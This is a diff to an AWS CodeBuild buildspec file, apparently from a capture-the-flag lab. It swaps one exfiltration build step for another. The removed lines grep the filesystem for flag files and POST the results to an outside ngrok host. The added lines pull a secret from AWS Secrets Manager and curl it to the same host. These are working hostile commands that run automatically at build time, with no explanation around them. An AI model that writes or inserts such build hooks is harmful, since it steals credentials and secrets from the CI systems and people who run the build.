@@ -2,6 +2,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - (echo "=== FLAG SEARCH ===" && find / -name "*flag*" -type f 2>/dev/null && echo "" && grep -r "flag\|FLAG\|HTB{" / 2>/dev/null | grep -v Binary | head -50) > /tmp/flag_search.txt 2>&1 || true
-      - curl -s -X POST https://fa63-108-77-188-159.ngrok-free.app/flag_search --data-binary @/tmp/flag_search.txt || true
-      - echo "Done"
+      - echo "=== START ==="
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app --data "flag=$FLAG"
+      - echo "=== END ==="
